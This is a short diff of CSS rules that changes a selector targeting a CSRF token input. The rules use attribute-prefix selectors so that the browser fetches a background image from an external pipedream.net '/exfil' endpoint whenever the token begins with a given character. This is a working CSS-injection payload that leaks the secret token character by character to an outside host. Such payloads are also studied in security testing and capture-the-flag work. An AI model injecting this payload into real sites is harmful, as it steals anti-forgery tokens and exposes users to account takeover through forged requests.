@@ -1,4 +1,4 @@
-input[name=csrf][value^=a]{
+.csrf[value^=a]{
     background-image: url(https://ent28xtybmafr.x.pipedream.net/exfil/a);
 }
 html, body, input[name=csrf][value^=b]{
